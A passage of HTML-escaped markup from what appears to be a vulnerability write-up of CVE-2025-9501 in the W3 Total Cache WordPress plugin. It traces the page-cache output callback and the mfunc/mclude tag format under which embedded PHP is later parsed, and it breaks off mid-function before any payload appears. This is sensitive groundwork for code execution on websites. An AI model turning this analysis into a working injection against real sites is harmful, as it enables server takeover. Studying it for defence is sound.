class=&#34;nx&#34;&gt;\W3TC\Dispatcher&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;component&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Mobile_Redirect&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&lt;span class=&#34;nv&#34;&gt;$w3tc_redirect&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&lt;span class=&#34;nv&#34;&gt;$w3tc_config&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;\W3TC\Dispatcher&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$w3tc_config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_boolean&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pgcache.enabled&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&#x9;&lt;span class=&#34;nv&#34;&gt;$o&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;\W3TC\Dispatcher&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;component&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;PgCache_ContentGrabber&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&#x9;&lt;span class=&#34;nv&#34;&gt;$o&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When page cache (&lt;code&gt;pgcache&lt;/code&gt;) is enabled, &lt;code&gt;$o-&amp;gt;process()&lt;/code&gt; handles page cache logic.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-22-cve-2025-9501/page_cache.png&#34; title=&#34;Enable page cache&#34; data-thumbnail=&#34;/posts/2025-11-22-cve-2025-9501/page_cache.png&#34; data-sub-html=&#34;&lt;h2&gt;Page Cache&lt;/h2&gt;&lt;p&gt;Enable page cache&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-22-cve-2025-9501/page_cache.png&#39; alt=&#34;Page Cache&#34; height=&#34;593&#34; width=&#34;1227&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Enable page cache&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;In &lt;code&gt;process()&lt;/code&gt;, the plugin prepares a mechanism to intercept page content before sending it to the browser:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;run_extensions_dropin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Util_Bus&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;add_ob_callback&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pagecache&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ob_callback&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This registers a callback:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;Util_Bus&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;add_ob_callback&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pagecache&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ob_callback&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Meaning:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Plugin registers a callback named &lt;code&gt;pagecache&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;The callback is the &lt;code&gt;ob_callback&lt;/code&gt; method of the current object.&lt;/li&gt;&#xA;&lt;li&gt;This is executed &lt;strong&gt;after WordPress generates the full HTML&lt;/strong&gt;, allowing the plugin to process it (optimize, compress, cache) before sending it to the client.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;code&gt;add_ob_callback()&lt;/code&gt; simply stores the callback:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;static&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;add_ob_callback&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$callback&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$GLOBALS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_w3tc_ob_callbacks&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$callback&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;ob_callback()&lt;/code&gt; is triggered when the output buffer is flushed, checking for dynamic content:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;ob_callback&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$has_dynamic&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;_has_dynamic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$has_dynamic&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;_shutdown_buffer&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;register_shutdown_function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;shutdown&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;code&gt;$buffer&lt;/code&gt; contains the full HTML WordPress generated.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;_has_dynamic()&lt;/code&gt; checks for non-cacheable sections:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;_has_dynamic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;defined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;W3TC_DYNAMIC_SECURITY&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;~&amp;lt;!--\s*m(func|clude)\s*&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;W3TC_DYNAMIC_SECURITY&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;(.*)--&amp;gt;(.*)&amp;lt;!--\s*/m(func|clude)\s*&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;W3TC_DYNAMIC_SECURITY&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;\s*--&amp;gt;~Uis&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Dynamic content format:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;!--&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;mfunc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;W3TC_DYNAMIC_SECURITY_VALUE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;--&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;PHP&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;code&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;lt;!--&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;mfunc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;W3TC_DYNAMIC_SECURITY_VALUE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;--&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;or&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;!--&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;mclude&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;W3TC_DYNAMIC_SECURITY_VALUE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;--&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;PHP&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;code&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;lt;!--&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;mclude&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;W3TC_DYNAMIC_SECURITY_VALUE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;If no dynamic content â†’ return buffer directly to cache.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;If dynamic content:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Save full HTML to &lt;code&gt;_shutdown_buffer&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Return empty string temporarily&lt;/li&gt;&#xA;&lt;li&gt;Register &lt;code&gt;shutdown()&lt;/code&gt; to process after PHP request finishes&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;shutdown&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$compression&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;_page_key_extension&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;compression&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;_parse_dynamic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;_shutdown_buffer&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span 